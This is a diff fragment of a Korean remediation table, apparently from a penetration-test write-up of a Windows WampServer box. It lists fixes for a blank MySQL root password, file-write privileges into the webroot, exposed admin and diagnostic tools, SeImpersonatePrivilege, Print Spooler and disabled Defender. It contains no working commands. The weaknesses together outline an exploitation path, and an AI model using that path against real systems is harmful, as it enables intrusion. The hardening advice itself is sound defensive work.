-| 방화벽이 3128만 열어둔 것에 의존 | **포트 차단은 프록시 앞에서 무의미하다.** 프록시 자체를 통제하지 않으면 방화벽 정책이 우회된다 |
+| **MySQL `root` 빈 패스워드** | 강한 패스워드 설정. `mysql_secure_installation` 실행. 애플리케이션은 최소권한 전용 계정으로 접속 |
+| **`@@secure_file_priv`가 빈 문자열** | 명시적 디렉터리(또는 `NULL`)로 설정. 애플리케이션 계정에서 `FILE` 권한 회수 — 파일 쓰기 원시 자체를 제거한다 |
+| mysqld가 웹루트에 쓰기 가능 | 웹루트는 배포 계정만 쓰기, 웹서버·DB 계정은 읽기 전용. DB 프로세스와 웹루트의 권한 분리 |
+| phpMyAdmin·adminer가 인증 없이 노출 | 관리 도구는 웹루트에서 제거하거나 IP 제한·별도 인증(HTTP Basic)·비표준 경로. 운영 서버에 두지 않는 것이 원칙 |
+| **`testmysql.php`·`phpsysinfo` 진단 스크립트 방치** | 배포 시 삭제. `phpsysinfo`는 호스트명·OS 빌드·MAC·디스크까지 인증 없이 유출했다 |
+| WampServer 기본 구성 그대로 운영 | 올인원 개발 패키지는 개발 전용이다. 운영에는 개별 설치 + 하드닝 |
+| `LOCAL SERVICE`가 `SeImpersonatePrivilege`를 복원 가능 | 근본 차단은 어렵다. 탐지로 보완 — 서비스 계정에 의한 예약 작업 생성(이벤트 4698)과 비정상 명명 파이프 생성을 모니터링 |
+| Print Spooler 실행 중 | 서버에서 인쇄가 불필요하면 Spooler 서비스 비활성화. PrintNightmare 계열 전체를 함께 막는다 |
+| **Defender 실시간 보호 비활성** | 재활성화. (이 박스의 certutil 실패는 AV가 아니라 경로 문제였다 — §6① 참조.) 서명 기반만으로는 리네이밍·패커에 뚫리므로 행위 기반 탐지 + ASR 규칙이 필요 |
+| 방화벽이 3128만 열어둔 것에 의존 | 포트 차단은 프록시 앞에서 무의미하다. 프록시 자체를 통제하지 않으면 방화벽 정책이 우회된다 |
 
 ---
 
